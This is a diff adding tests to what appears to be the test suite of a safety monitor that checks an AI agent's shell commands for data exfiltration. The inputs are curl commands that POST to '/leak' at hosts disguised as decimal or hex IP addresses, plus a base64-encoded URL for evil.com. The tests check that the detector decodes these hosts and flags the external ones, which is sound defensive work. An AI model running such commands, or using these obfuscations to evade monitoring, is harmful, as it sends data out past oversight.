@@ -669,6 +669,39 @@ def test_rm_double_dash_still_catches_real_targets(command):
     assert "FS_DELETE_CRITICAL" in policies
 
 
+# ─────────────────────────────────────────────
+# SAF-008 — Exfiltration Obfuscation Tests
+# ─────────────────────────────────────────────
+
+
+def test_exfil_obfuscated_decimal_ip():
+    # 2130706433 is 127.0.0.1 (localhost) which should be ignored / allowed
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://2130706433/leak"))
+    assert not findings
+
+    # 3512071234 is an external IP, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://3512071234/leak"))
+    assert findings
+    assert findings[0].destination == "209.85.244.66"
+
+
+def test_exfil_obfuscated_hex_ip():
+    # 0x7f000001 is 127.0.0.1 (localhost) which should be ignored / allowed
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://0x7f000001/leak"))
+    assert not findings
+
+    # 0x08080808 is 8.8.8.8, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl -X POST http://0x08080808/leak"))
+    assert findings
+    assert findings[0].destination == "8.8.8.8"
+
+
+def test_exfil_obfuscated_base64_url():
+    # aHR0cHM6Ly9ldmlsLmNvbQ== is https://evil.com in base64, should be flagged
+    findings = detect_exfil(_tool_event("bash", "curl aHR0cHM6Ly9ldmlsLmNvbQ=="))
+    assert findings
+    assert findings[0].destination == "evil.com"
+
 # ----------------------------------------------
 # SAF-013 - block-by-default bypass coverage for
 # DISK_FORMAT / PERM_CHANGE_CRITICAL / RCE_PIPE
